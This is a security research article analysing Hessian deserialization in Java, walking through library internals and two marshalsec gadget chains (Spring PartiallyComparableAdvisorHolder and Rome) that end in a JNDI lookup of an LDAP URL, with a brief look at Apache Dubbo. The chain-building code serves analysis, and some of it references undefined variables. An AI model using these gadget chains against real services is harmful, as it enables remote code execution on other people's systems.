**Author：Longofo@Knownsec 404 Team**  
**Time: February 20, 2020**  
**Chinese version:<https://paper.seebug.org/1131/>**

Not long ago, there was a vulnerability about Apache Dubbo Http
deserialization. It was originally a normal function (it can be verified that
it is indeed a normal function instead of an unexpected Post by calling the
packet capture normally),the serialized data is transmitted via Post for
remote calls,but if Post passes malicious serialized data, it can be used
maliciously. Apache Dubbo also supports many protocols, such as Dubbo (Dubbo
Hessian2), Hessian (including Hessian and Hessian2, where Hessian2 and Dubbo
Hessian2 are not same), Rmi, Http, etc. Apache Dubbo is a remote call
framework. Since the remote call of Http mode transmits serialized data, other
protocols may also have similar problems, such as Rmi, Hessian, etc. I haven't
analyzed a deserialization component processing flow completely before, just
take this opportunity to look at the Hessian serialization, deserialization
process, and [marshalsec](https://github.com/mbechler/marshalsec) Several
gadget chains for Hessian in the tool.

#### About serialization/deserialization mechanism

Serialization/deserialization mechanism(also called marshalling/unmarshalling
mechanism, marshalling/unmarshalling has a wider meaning than
serialization/deserialization), refer to
[marshalsec.pdf](https://www.github.com/ mbechler / marshalsec / blob / master
/ marshalsec.pdf? raw = true), the serialization/deserialization mechanism can
be roughly divided into two categories:

  * Based on Bean attribute access mechanism
  * Based on Field mechanism

##### Based on Bean attribute access mechanism

  * SnakeYAML
  * jYAML
  * YamlBeans
  * Apache Flex BlazeDS
  * Red5 IO AMF 
  * Jackson
  * Castor
  * Java XMLDecoder
  * ...

The most basic difference between them is how to set the property value on the
object. They have common points and also have their own unique processing
methods. Some automatically call `getter (xxx)` and `setter (xxx)` to access
object properties through reflection, and some need to call the default
Constructor, and some processors (referring to those listed above)
deserialized objects If some methods of the class object also meet certain
requirements set by themselves, they will be automatically called. There also
have a XML Decoder processor that can call any method of an object. When some
processors support polymorphism, for example, a certain property of an object
is of type Object, Interface, abstract, etc. In order to be completely
restored during deserialization, specific type information needs to be
written. At this time, you can specify For more classes, certain methods of
concrete class objects are automatically called when deserializing to set the
property values of these objects. The attack surface of this mechanism is
larger than the attack surface based on the Field mechanism because they
automatically call more methods and automatically call methods when they
support polymorphic features than the Field mechanism.

##### Based on Field mechanism

The field-based mechanism is implemented by special native methods (native
methods are not implemented in java code, so it won't call more java methods
such as getter and setter like Bean mechanism.) are invoked like the Bean
mechanism. The mechanism of the assignment operation is not to assign
attributes to the property through getters and setters (some processors below
can also support the Bean mechanism if they are specially specified or
configured). The payload in ysoserial is based on Java Serialization.
Marshalsec supports multiple types, including the ones listed above and the
ones listed below：

  * Java Serialization
  * Kryo
  * Hessian
  * json-io 
  * X Stream
  * ...

As far as method made by objects are concerned, field-based mechanisms often
do not constitute an attack surface. In addition, many collections, Maps, and
other types cannot be transmitted/stored using their runtime
representation(for example, Map, which stores information such as the hashcode
of the object at runtime, but does not save this information when storing),
which means All field-based marshallers bundle custom converters for certain
types (for example, there is a dedicated MapSerializer converter in Hessian).
These converters or their respective target types must usually call methods on
the object provided by the attacker. For example, in Hessian, if the map type
is deserialized, `MapDeserializer` is called to process the map. During this
time, the map `put` method is called, it will calculate the hash of the
recovered object and cause a `hashcode` call (here the call to the `hashcode`
method is to say that the method on the object provided by the attacker must
be called). According to the actual situation, the `hashcode` method may
trigger subsequent other method calls .

#### Hessian Introduction

Hessian is a binary web service protocol. It has officially implemented
multiple languages such as Java, Flash / Flex, Python, C ++, .NET C #, etc.
Hessian, Axis, and XFire can implement remote method invocation of web
services. The difference is that Hessian is a binary protocol and Axis and X
Fire are SOAP protocols. Therefore, Hessian is far superior to the latter two
in terms of performance, and Hessian JAVA is very simple to use. It uses the
Java language interface to define remote objects and integrates
serialization/deserialization and RMI functions. This article mainly explains
serialization/deserialization of Hessian.

Here is a simple test of Hessian Serialization and Java Serialization:

    
    
    //Student.java
    import java.io.Serializable;
    
    public class Student implements Serializable {
        private static final long serialVersionUID = 1L;
        private int id;
        private String name;
        private transient String gender;
    
        public int getId() {
            System.out.println("Student getId call");
            return id;
        }
    
        public void setId(int id) {
            System.out.println("Student setId call");
            this.id = id;
        }
    
        public String getName() {
            System.out.println("Student getName call");
            return name;
        }
    
        public void setName(String name) {
            System.out.println("Student setName call");
            this.name = name;
        }
    
        public String getGender() {
            System.out.println("Student getGender call");
            return gender;
        }
    
        public void setGender(String gender) {
            System.out.println("Student setGender call");
            this.gender = gender;
        }
    
        public Student() {
            System.out.println("Student default constractor call");
        }
    
        public Student(int id, String name, String gender) {
            this.id = id;
            this.name = name;
            this.gender = gender;
        }
    
        @Override
        public String toString() {
            return "Student(id=" + id + ",name=" + name + ",gender=" + gender + ")";
        }
    }
    
    
    //HJSerializationTest.java
    import com.caucho.hessian.io.HessianInput;
    import com.caucho.hessian.io.HessianOutput;
    
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    
    public class HJSerializationTest {
        public static <T> byte[] hserialize(T t) {
            byte[] data = null;
            try {
                ByteArrayOutputStream os = new ByteArrayOutputStream();
                HessianOutput output = new HessianOutput(os);
                output.writeObject(t);
                data = os.toByteArray();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return data;
        }
    
        public static <T> T hdeserialize(byte[] data) {
            if (data == null) {
                return null;
            }
            Object result = null;
            try {
                ByteArrayInputStream is = new ByteArrayInputStream(data);
                HessianInput input = new HessianInput(is);
                result = input.readObject();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return (T) result;
        }
    
        public static <T> byte[] jdkSerialize(T t) {
            byte[] data = null;
            try {
                ByteArrayOutputStream os = new ByteArrayOutputStream();
                ObjectOutputStream output = new ObjectOutputStream(os);
                output.writeObject(t);
                output.flush();
                output.close();
                data = os.toByteArray();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return data;
        }
    
        public static <T> T jdkDeserialize(byte[] data) {
            if (data == null) {
                return null;
            }
            Object result = null;
            try {
                ByteArrayInputStream is = new ByteArrayInputStream(data);
                ObjectInputStream input = new ObjectInputStream(is);
                result = input.readObject();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return (T) result;
        }
    
        public static void main(String[] args) {
            Student stu = new Student(1, "hessian", "boy");
    
            long htime1 = System.currentTimeMillis();
            byte[] hdata = hserialize(stu);
            long htime2 = System.currentTimeMillis();
            System.out.println("hessian serialize result length = " + hdata.length + "," + "cost time：" + (htime2 - htime1));
    
            long htime3 = System.currentTimeMillis();
            Student hstudent = hdeserialize(hdata);
            long htime4 = System.currentTimeMillis();
            System.out.println("hessian deserialize result：" + hstudent + "," + "cost time：" + (htime4 - htime3));
            System.out.println();
    
            long jtime1 = System.currentTimeMillis();
            byte[] jdata = jdkSerialize(stu);
            long jtime2 = System.currentTimeMillis();
            System.out.println("jdk serialize result length = " + jdata.length + "," + "cost time：" + (jtime2 - jtime1));
    
            long jtime3 = System.currentTimeMillis();
            Student jstudent = jdkDeserialize(jdata);
            long jtime4 = System.currentTimeMillis();
            System.out.println("jdk deserialize result：" + jstudent + "," + "cost time：" + (jtime4 - jtime3));
        }
    }

The results are as follows:

    
    
    hessian serialize result length = 64,cost time：45
    hessian deserialize result：Student(id=1,name=hessian,gender=null),cost time：3
    
    jdk serialize result length = 100,cost time：5
    jdk deserialize result：Student(id=1,name=hessian,gender=null),cost time：43

Through this test, it can be easily seen that Hessian deserialization takes
less space than JDK deserialization results. Hessian serialization takes
longer than JDK serialization, but Hessian deserialization is fast. And both
are based on the Field mechanism, no getter and setter methods are called, and
the constructor is not called during deserialization.

#### Hessian concept map

The following are the conceptual diagrams commonly used in the analysis of
Hessian on the Internet. In the new version, these are the overall structures,
and I Just use it directly:

![](https://images.seebug.org/content/images/2020/03/01550926-67be-40ee-97ca-98236ad3ea89.png-w331s)

  * Serializer: Serialized interface
  * Deserializer: deserializer interface
  * Abstract Hessian Input: Hessian custom input stream, providing corresponding read various types of methods
  * Abstract Hessian Output: Hessian custom output stream, providing corresponding write various types of methods
  * Abstract Serializer Factory
  * Serializer Factory: Standard implementation of Hessian serialization factory
  * ExtSerializer Factory: You can set a custom serialization mechanism, which can be extended through this Factory
  * Bean Serializer Factory: Force the serialization mechanism of the Serializer Factory's default object to be specified, and specify to use the Bean Serializer to process the object

Hessian Serializer/Derializer implements the following
serializers/deserializers by default. Users can also customize
serializers/deserializers through interfaces/abstract classes:

![](https://images.seebug.org/content/images/2020/03/6e3c0c55-b89b-43b0-a1d7-13addf814566.png-w331s)

![](https://images.seebug.org/content/images/2020/03/3030c522-f329-4cb3-9a4c-0929de035c2b.png-w331s)

When serializing, it will select the corresponding serialization according to
different types of objects and attributes for serialization; when
deserializing, it will also select different deserializers according to
different types of objects and attributes; each type of serializer also has
specific Field Serializer. Note here that Java Serializer/Java Deserializer
and Bean Serializer/Bean Deserializer are not type serializers/deserializers,
but belong to mechanism serializers/deserializers:

  * Java Serializer: Get all bean properties for serialization by reflection, exclude static and transient properties, and perform recursive serialization on all other properties (such as the property itself is an object)
  * Bean Serializer follows the conventions of pojo beans, scans all the methods of the bean, and finds that the properties of the get and set methods are serialized. It does not directly manipulate all the properties, which is gentle.

#### Hessian deserialization process

Here a demo is used for debugging. The Student property contains String, int,
List, Map, Object type properties, and the property setter and getter methods
are added, as well as the read Resovle, finalize, to String, hash Code
methods, and The output was carried out for easy observation. Although it will
not cover all the logic of Hessian, we can roughly see its appearance:

    
    
    //people.java
    public class People {
        int id;
        String name;
    
        public int getId() {
            System.out.println("Student getId call");
            return id;
        }
    
        public void setId(int id) {
            System.out.println("Student setId call");
            this.id = id;
        }
    
        public String getName() {
            System.out.println("Student getName call");
            return name;
        }
    
        public void setName(String name) {
            System.out.println("Student setName call");
            this.name = name;
        }
    }
    
    
    //SerialTest.java
    public class SerialTest {
    
        public static <T> byte[] serialize(T t) {
            byte[] data = null;
            try {
                ByteArrayOutputStream os = new ByteArrayOutputStream();
                HessianOutput output = new HessianOutput(os);
                output.writeObject(t);
                data = os.toByteArray();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return data;
        }
    
        public static <T> T deserialize(byte[] data) {
            if (data == null) {
                return null;
            }
            Object result = null;
            try {
                ByteArrayInputStream is = new ByteArrayInputStream(data);
                HessianInput input = new HessianInput(is);
                result = input.readObject();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return (T) result;
        }
    
        public static void main(String[] args) {
            int id = 111;
            String name = "hessian";
            String gender = "boy";
    
            Map innerMap = new HashMap<String, Class<Object>>();
            innerMap.put("1", ObjectInputStream.class);
            innerMap.put("2", SQLData.class);
    
            Student friend = new Student(222, "hessian1", "boy");
            List friends = new ArrayList<Student>();
            friends.add(friend);
    
            Student stu = new Student();
            stu.setId(id);
            stu.setName(name);
            stu.setGender(gender);
            stu.setInnerMap(innerMap);
            stu.setFriends(friends);
    
            System.out.println("---------------hessian serialize----------------");
            byte[] obj = serialize(stu);
            System.out.println(new String(obj));
    
            System.out.println("---------------hessian deserialize--------------");
            Student student = deserialize(obj);
            System.out.println(student);
        }
    }

The following is the general appearance of Hessian's processing during
deserialization drawn after debugging the above demo. (The picture is not
clear, you can click [this
link](https://www.processon.com/view/link/5c714c28e4b03334b5273bd6)):

![](https://images.seebug.org/content/images/2020/03/faccc4b0-e225-459d-ad91-257d4f004f9f.png-w331s)

The following details are explained by debugging to some key positions.

##### Get target type deserializer

First enter Hessian Input,read Object () to read the tag type identifier.
Since Hessian serializes the result into a Map, the first tag is always M
(ascii 77):

![](https://images.seebug.org/content/images/2020/03/d4ae173a-b8f4-4a5c-8efd-2aab58c8fec9.png-w331s)

In the processing of `case 77`, the type to be deserialized is read, then
`this._serializerFactory.readMap (in, type)`is called for processing. By
default, Hessian standard used by _serializer Factory implements Serializer
Factory:

![](https://images.seebug.org/content/images/2020/03/09169830-479e-4ef9-9819-eaed5f22fce2.png-w331s)

First get the corresponding Deserializer of this type, then call the
corresponding `Deserializer.readMap (in)` for processing, and see how to get
the corresponding Derserializer:

![](https://images.seebug.org/content/images/2020/03/338b0989-5444-42ea-810c-492b19aaf17e.png-w331s)

![](https://images.seebug.org/content/images/2020/03/ad2daf27-9e8e-4247-8f13-177372542fa6.png-w331s)

The first red box mainly determines whether a deserializer of this type is
cached in `_cacheTypeDeserializerMap`; the second red box mainly determines
whether a deserializer of this type is cached in`_staticTypeMap`,
`_staticTypeMap` mainly stores the basic type and the corresponding
deserializer; the third red box determines whether it is an array type, and if
so, enters the array type processing; the fourth obtains the Class
corresponding to the type, and enters `this .getDeserializer(Class)` gets the
Deserializer corresponding to this class, this example enters the fourth:

![](https://images.seebug.org/content/images/2020/03/e6bef326-aea1-4e49-90c8-45749c100ca2.png-w331s)

Here it again judged whether it is in the cache, but this time it used
`_cacheDeserializerMap`, whose type is `ConcurrentHashMap`, and before that it
was `_cacheTypeDeserializerMap`, and the type was `HashMap`. This may be to
solve the problem of obtaining in multithread . This example enters the second
`this.loadDeserializer(Class)`:

![](https://images.seebug.org/content/images/2020/03/9fe8b3aa-b76e-4f1e-aad8-111f826a5b8f.png-w331s)

![](https://images.seebug.org/content/images/2020/03/b009e106-4660-45b7-accc-3506908f5722.png-w331s)

![](https://images.seebug.org/content/images/2020/03/79cad725-e3f2-45c0-a791-6cf0e3499129.png-w331s)

The first red box is to traverse the Serializer Factory set by the user and
try to get the Serializer corresponding to the type from each factory; the
second red box tries to get the Serializer corresponding to the type from the
context factory; the third red box Try to create a context factory and try to
get a custom deserializer of this type, and the deserializer corresponding to
this type needs to be similar to `xxxHessianDeserializer`, where `xxx`
indicates the class name of the type; the fourth red box is judged in turn, If
not match, then use `getDefaultDeserializer (Class),`. This example is the
fourth:

![](https://images.seebug.org/content/images/2020/03/e06dda2c-f404-48e2-8586-43e94c82594f.png-w331s)

`_isEnableUnsafeSerializer` is true by default. The determination of this
value is first determined based on whether the the unsafe field of
`sun.misc.Unsafe` is empty, and the unsafe field of`sun.misc.Unsafe` is
initialized in the static code block by default and Not empty, so it is true;
then it will also be based on whether the system property
`com.caucho.hessian.unsafe` is false. If it is false, the value determined by
`sun.misc.Unsafe` is ignored, but the system property `com.
caucho.hessian.unsafe` is null by default, so it won't replace the result of
ture. Therefore, the value of `_isEnableUnsafeSerializer` is true by default,
so the above figure defaults to the UnsafeDeserializer used, and enters its
constructor.

##### Get deserializer of each attribute of target type

![](https://images.seebug.org/content/images/2020/03/b928e2e8-26ed-410a-b698-f90e2262c359.png-w331s)

Here all the properties of the type are obtained and the corresponding
FieldDeserializer is determined. It is also determined whether there is a
ReadResolve () method in the class of the type. Let's first see how the type
property and FieldDeserializer determine:

![](https://images.seebug.org/content/images/2020/03/aff6dd80-0ad4-470f-9468-0f0585675364.png-w331s)

![](https://images.seebug.org/content/images/2020/03/ce5bb752-778b-4cd7-9c7d-4a47cc60aeb6.png-w331s)

![](https://images.seebug.org/content/images/2020/03/83970571-19cc-4db1-8f59-48c9ac79ea93.png-w331s)

Get the properties of this type and all parent classes, determine the FIeld
Deserializer of the corresponding properties in turn, and the properties
cannot be transient or static modified properties. The following is the Field
Deserializer that determines the corresponding properties in turn. Some Field
Deserializers are customized in Unsafe Deserializer.

##### Determine if the target type has a read Resolve() method defined

Then in the above Unsafe Deserializer constructor, it will also determine
whether there is a `readResolve()` method in a class of this type:

![](https://images.seebug.org/content/images/2020/03/da0f94b3-b7c0-43d8-99bf-d813b8e487db.png-w331s)

Iterate through all the methods in this class to determine if there is a
`readResolve()` method.

Okay, after that the acquired Deserializer are returned in the original way.
In this example, the class uses Unsafe Deserializer, and then returns to
`SerializerFactory.readMap (in, type)` and calls `UnsafeDeserializer.readMap
(in)`:

![](https://images.seebug.org/content/images/2020/03/5e428357-575e-4f02-888b-9b19361615d7.png-w331s)

So far, the deserializer `UnsafeDeserializer` of
the`com.longofo.deserialize.Student` class in this example is obtained, and
the Field Serializer corresponding to each field is defined. At the same time,
the `readResolve()` method is defined in the Student class, so got the
`readResolve()` method of this class.

##### Assigning object to target type

Next, an object is assigned to the target type:

![](https://images.seebug.org/content/images/2020/03/86793db0-2b7e-466d-9894-1a523cf15e17.png-w331s)

![](https://images.seebug.org/content/images/2020/03/8f914475-f609-4a5c-ac47-3a4396d6ecc2.png-w331s)

An instance of this class is allocated via `_unsafe.allocateInstance
(classType)`. This method is a native method in `sun.misc.Unsafe`. Assigning
an instance object to this class does not trigger a constructor call. The
attributes are now just given the JDK default values.

##### Recovery of target type object attribute values

The next step is to restore the attribute values of the target type object:

![](https://images.seebug.org/content/images/2020/03/1ec3b19b-577c-4288-bc43-ed1f639f300d.png-w331s)

Into the loop, first call `in.readObject ()` to get the attribute name from
the input stream, then match the Field Deserizlizer corresponding to the
attribute from the previously determined `this._fieldMap`, and then call Field
Deserializer on the match to process. The serialized attributes in this
example are inner Map (Map type), name (String type), id (int type), and
friends (List type). Here we take the inner Map attribute recovery as an
example.

###### Take Inner Map attribute recovery as an example

The Field Deserializer corresponding to the inner Map is `UnsafeDeserializer$
ObjectFieldDeserializer`:

![](https://images.seebug.org/content/images/2020/03/ad84891a-b00d-471c-9b97-9720987cf6f7.png-w331s)

First call `in.readObject (fieldClassType)` to get the property value from the
input stream, and then call `_unsafe.putObject`, the native method
in`sun.misc.Unsafe`, and will not trigger the getter and setter methods.
Here's how to deal with `in.readObject (fieldClassType)`:

![](https://images.seebug.org/content/images/2020/03/29a4ea53-5971-4607-85c0-125504e7f5ee.png-w331s)

Here Map type uses Map Deserializer, correspondingly calling
`MapDeserializer.readMap (in)` method to restore a Map object:

![](https://images.seebug.org/content/images/2020/03/314caced-8873-4abd-92c2-0ddce5b4acc2.png-w331s)

![](https://images.seebug.org/content/images/2020/03/048a1ceb-c28a-4a6f-aab2-cd890934212e.png-w331s)

Note the several judgments here. If it is a Map interface type, Hash Map is
used. If it is a Sorted Map type, Tree Map is used. Other Maps will call the
corresponding default constructor. In this example, because it is a Map
interface type, Hash Map is used. Next comes the classic scenario. First use
`in.readObject()` (this process is similar to the previous one and will not be
repeated). The map's key and value objects in the serialized data are
restored, and then call `map.put (key, value)`, here is Hash Map, the put
method of Hash Map will call `hash(key)` to trigger the `key.hashCode()`
method of key object, and put Val will be called in put method, and put Val
will Call the `key.equals (obj)` method of the key object. After processing
all keys and values, return to `UnsafeDeserializer$ObjectFieldDeserializer`:

![](https://images.seebug.org/content/images/2020/03/c5db341c-3905-43a3-a45f-a2f9a2f15a4c.png-w331s)

Use the native method `_unsafe.putObject` to complete the inner Map property
assignment of the object.

#### Analysis of several Hessian gadget chains

In the marshalsec tool, there are several chains available for Hessian
deserialization:

![](https://images.seebug.org/content/images/2020/03/73354a50-97fa-403a-b91d-bdb85d18e5b2.png-w331s)

  * Rome
  * X Bean
  * Resin
  * Spring Partially Comparable Advisor Holder
  * Spring Abstract Bean Factory Pointcu tAdvisor

Let‘s analyze two of them, Rome and Spring Partially Comparable Advisor
Holder. Rome is triggered by `HashMap.put`->`key.hashCode`, and Spring
Partially Comparable Advisor Holder is triggered by
`HashMap.put`->`key.equals`. Several others are similar, either using hash
Code or equals.

##### SpringPartiallyComparableAdvisorHolder

There are all corresponding Gadget Tests in marshalsec, which is very
convenient:

![](https://images.seebug.org/content/images/2020/03/d080faba-e3ca-4a21-99a1-80582c93e3c5.png-w331s)

![](https://images.seebug.org/content/images/2020/03/ba6c3521-6349-4cf8-b8b0-8fa06c8accd9.png-w331s)

To make it clearer, I extracted `SpringPartiallyComparableAdvisorHolder`
gadget chain from marshalsec:

    
    
    String jndiUrl = "ldap://localhost:1389/obj";
    SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
    bf.setShareableResources(jndiUrl);
    
    //BeanFactoryAspectInstanceFactory.getOrder is called when deserializing，it Will trigger the call SimpleJndiBeanFactory.getType->SimpleJndiBeanFactory.doGetType->SimpleJndiBeanFactory.doGetSingleton->SimpleJndiBeanFactory.lookup->JndiTemplate.lookup
    Reflections.setFieldValue(bf, "logger", new NoOpLog());
    Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
    
    //AspectJAroundAdvice.getOrder is called when deserializing，it will trigger the call BeanFactoryAspectInstanceFactory.getOrder
    AspectInstanceFactory aif = Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
    Reflections.setFieldValue(aif, "beanFactory", bf);
    Reflections.setFieldValue(aif, "name", jndiUrl);
    
    //AspectJPointcutAdvisor.getOrder is called when deserializing, it will trigger the call AspectJAroundAdvice.getOrder
    AbstractAspectJAdvice advice = Reflections.createWithoutConstructor(AspectJAroundAdvice.class);
    Reflections.setFieldValue(advice, "aspectInstanceFactory", aif);
    
    //PartiallyComparableAdvisorHolder.toString is called when deserializing, it will trigger the call AspectJPointcutAdvisor.getOrder
    AspectJPointcutAdvisor advisor = Reflections.createWithoutConstructor(AspectJPointcutAdvisor.class);
    Reflections.setFieldValue(advisor, "advice", advice);
    
    //Xstring.equals is called when deserializing, it will trigger the call PartiallyComparableAdvisorHolder.toString
    Class<?> pcahCl = Class.forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
    Object pcah = Reflections.createWithoutConstructor(pcahCl);
    Reflections.setFieldValue(pcah, "advisor", advisor);
    
    //HotSwappableTargetSource.equals is called when deserializing, it will trigger the call Xstring.equals
    HotSwappableTargetSource v1 = new HotSwappableTargetSource(pcah);
    HotSwappableTargetSource v2 = new HotSwappableTargetSource(Xstring("xxx"));
    
    //HashMap.putVal is called when deserializing, it will trigger the call HotSwappableTargetSource.equals. There is no direct use of the HashMap.put setting value. Direct put will trigger the utilization chain locally, so using marshalsec uses a more special processing method.
    HashMap<Object, Object> s = new HashMap<>();
    Reflections.setFieldValue(s, "size", 2);
    Class<?> nodeC;
    try {
        nodeC = Class.forName("java.util.HashMap$Node");
    }
    catch ( ClassNotFoundException e ) {
        nodeC = Class.forName("java.util.HashMap$Entry");
    }
    Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
    nodeCons.setAccessible(true);
    
    Object tbl = Array.newInstance(nodeC, 2);
    Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
    Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
    Reflections.setFieldValue(s, "table", tbl);

Look at the following trigger process:

After `HessianInput.readObject()`, it comes to `MapDeserializer.readMap (in)`
to process Map type attributes, which triggers `HashMap.put (key, value)`:

![](https://images.seebug.org/content/images/2020/03/04df1894-5ca8-4762-839d-86da38ce7d91.png-w331s)

`HashMap.put` has called the`HashMap.putVal` method, and the `key.equals(k)`
method will be triggered on the second put:

![](https://images.seebug.org/content/images/2020/03/547a9079-00e8-4235-8571-347ec856ca75.png-w331s)

At this time, key and k are as follows, both are Hot Swappable Target Source
objects:

![](https://images.seebug.org/content/images/2020/03/33603422-74e4-4ba6-aa0d-a0399182d395.png-w331s)

Enter `HotSwappableTargetSource.equals`:
![](https://images.seebug.org/content/images/2020/03/bf06bb66-eaf6-460c-a2de-b44a05363b3f.png-w331s)

In `HotSwappableTargetSource.equals`, the respective `target.equals` method is
triggered, that is, `XString.equals(PartiallyComparableAdvisorHolder)`:

![](https://images.seebug.org/content/images/2020/03/0225332c-87b8-49b2-a5f5-cb1271022fbd.png-w331s)

`PartiallyComparableAdvisorHolder.toString` is triggered here:

![](https://images.seebug.org/content/images/2020/03/8b426fe8-2fe9-4a86-ac5d-c28930808b7b.png-w331s)

Triggered `AspectJPointcutAdvisor.getOrder`:

![](https://images.seebug.org/content/images/2020/03/f5f892e3-ce07-47a8-980c-63d8a0d90770.png-w331s)

触发了`AspectJAroundAdvice.getOrder`：

![](https://images.seebug.org/content/images/2020/03/912a13c1-4257-4e28-a328-c44c0eaa9c76.png-w331s)

Here trigger `BeanFactoryAspectInstanceFactory.getOrder`:

![](https://images.seebug.org/content/images/2020/03/f69adae7-0038-4ee8-a029-159a5428c98d.png-w331s)

This triggered
`SimpleJndiBeanFactory.getTYpe`->`SimpleJndiBeanFactory.doGetType`->
`SimpleJndiBeanFactory.doGetSingleton`->`SimpleJndiBeanFactory.lookup`->
`JndiTemplate.lookup`->`Context.lookup`:

![](https://images.seebug.org/content/images/2020/03/7b14edda-4198-44f8-8dd4-1f6652a5a17c.png-w331s)

![](https://images.seebug.org/content/images/2020/03/f3f7f6a8-d19a-4f8c-93d4-5ab458dc784f.png-w331s)

##### Rome

Rome is relatively simple to trigger:

![](https://images.seebug.org/content/images/2020/03/be492945-dfe7-4e77-a74e-c9774c7061dc.png-w331s)

Like above, I extracted the gadget chain:

    
    
    //ToStringBean.toString() is called when deserializing，it will trigger the call JdbcRowSetImpl.getDatabaseMetaData->JdbcRowSetImpl.connect->Context.lookup
    String jndiUrl = "ldap://localhost:1389/obj";
    JdbcRowSetImpl rs = new JdbcRowSetImpl();
    rs.setDataSourceName(jndiUrl);
    rs.setMatchColumn("foo");
    
    //EqualsBean.beanHashCode is called when deserializing, it will trigger the call ToStringBean.toString
    ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, obj);
    
    //HashMap.hash is called when deserializing, it will trigger the call EqualsBean.hashCode->EqualsBean.beanHashCode
    EqualsBean root = new EqualsBean(ToStringBean.class, item);
    
    //HashMap.put->HashMap.putVal->HashMap.hash
    HashMap<Object, Object> s = new HashMap<>();
    Reflections.setFieldValue(s, "size", 2);
    Class<?> nodeC;
    try {
        nodeC = Class.forName("java.util.HashMap$Node");
    }
    catch ( ClassNotFoundException e ) {
        nodeC = Class.forName("java.util.HashMap$Entry");
    }
    Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
    nodeCons.setAccessible(true);
    
    Object tbl = Array.newInstance(nodeC, 2);
    Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
    Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
    Reflections.setFieldValue(s, "table", tbl);

Take a look at the trigger process:

![](https://images.seebug.org/content/images/2020/03/b923fec8-34c9-4819-9cfb-0612becad332.png-w331s)

Then called the hash method, which called the `key.hashCode` method:

![](https://images.seebug.org/content/images/2020/03/afb6950b-d8a2-4ccf-aedc-e5633c7dced7.png-w331s)

![](https://images.seebug.org/content/images/2020/03/5f21b7d1-4454-4752-8777-89ae50896d21.png-w331s)

Then `EqualsBean.hashCode`-> `EqualsBean.beanHashCode` is triggered:

![](https://images.seebug.org/content/images/2020/03/2ebd36c9-a95c-44a8-abd8-5d078b83b82f.png-w331s)

Triggered `ToStringBean.toString`:

![](https://images.seebug.org/content/images/2020/03/5a82e8a4-d162-4225-9f0f-a8548ccb9b11.png-w331s)

This calls `JdbcRowSetImpl.getDatabaseMetadata`, which
triggers`JdbcRowSetImpl.connect`-> `context.lookup`:

![](https://images.seebug.org/content/images/2020/03/72759d6f-ddee-44f0-b8b1-333cf86f9371.png-w331s)

##### summary

As can be seen from the above two chains, when Hessian deserialization
basically uses deserialization to process the Map type, the call
`Map.put`->`Map.putVal`-> `key.hashCode` / `key.equals`-> ... will be
triggered, the subsequent series of starting processes are also related to
polymorphic characteristics. Some class attributes are of type Object, which
can be set to any class, and the hash Code and equals methods just call
Certain methods of properties carry out a subsequent series of triggers. So to
find such a gadget chain, we can directly find the classes with hash Code,
equals, and read Resolve methods, and then people judge and construct, but
this workload should be heavy; or use some chain mining tools, write rules to
scan as needed.

#### Simple analysis of Apache Dubbo deserialization

##### Apache Dubbo Http deserialization

Let's take a brief look at the HTTP problem mentioned earlier, and directly
use the official [samples](https://github.com/apache/dubbo-samples/tree/master/java), there is a dubbo-samples-http which can be used
directly, put a breakpoint directly in the `DemoServiceImpl.sayHello` method,
and deserialize the data in
`RemoteInvocationSerializingExporter.doReadRemoteInvocation`, using Java
Serialization:

![](https://images.seebug.org/content/images/2020/03/203f33a9-eecb-4317-8c5d-893f2b8d6ff7.png-w331s)

Looking at the packet, the obvious `ac ed` flag:

![](https://images.seebug.org/content/images/2020/03/958bd047-3c5e-4bdc-8fa5-24f36ad00a62.png-w331s)

##### Apache Dubbo Dubbo deserialization

Also use the official Dubbo-samples-basic, the default Dubbo hessian2
protocol, Dubbo has magically modified the hessian2, but the general structure
is still similar, in `MapDeserializer.readMap` is still similar to Hessian:

![](https://images.seebug.org/content/images/2020/03/4608feb7-83b0-4781-96df-36db821265f3.png-w331s)

#### Reference

  1. <https://docs.ioin.in/writeup/blog.csdn.net/_u011721501_article_details_79443598/index.html>
  2. <https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf>
  3. <https://www.mi1k7ea.com/2020/01/25/Java-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/>
  4. <https://zhuanlan.zhihu.com/p/44787200>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1137/>

